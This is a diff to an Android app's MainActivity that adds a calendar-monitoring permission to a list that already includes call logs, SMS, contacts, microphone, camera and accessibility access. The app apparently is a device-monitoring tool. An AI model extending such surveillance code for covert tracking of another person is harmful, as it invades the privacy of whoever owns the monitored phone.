@@ -246,6 +246,16 @@ class MainActivity : ComponentActivity() {
             )
         )
 
+        // 5. Calendar Events
+        permissionsListState.add(
+            PermissionItem(
+                id = "calendar",
+                title = "Calendar Events & Schedule",
+                description = "Monitors device calendar schedules, appointments, and reminders.",
+                isGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED
+            )
+        )
+
         // 5. Audio Recording
         permissionsListState.add(
             PermissionItem(
@@ -335,6 +345,7 @@ class MainActivity : ComponentActivity() {
                 "calls" -> ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
                 "sms" -> ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
                 "contacts" -> ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
+                "calendar" -> ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED
                 "audio" -> ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
                 "camera" -> ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
                 "accessibility" -> isAccessibilityServiceEnabled()
@@ -355,6 +366,7 @@ class MainActivity : ComponentActivity() {
             "calls" -> runtimePermissionLauncher.launch(arrayOf(Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_PHONE_STATE))
             "sms" -> runtimePermissionLauncher.launch(arrayOf(Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS))
             "contacts" -> runtimePermissionLauncher.launch(arrayOf(Manifest.permission.READ_CONTACTS))
+            "calendar" -> runtimePermissionLauncher.launch(arrayOf(Manifest.permission.READ_CALENDAR))
             "audio" -> runtimePermissionLauncher.launch(arrayOf(Manifest.permission.RECORD_AUDIO))
             "camera" -> runtimePermissionLauncher.launch(arrayOf(Manifest.permission.CAMERA))
             "accessibility" -> settingsActivityLauncher.launch(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
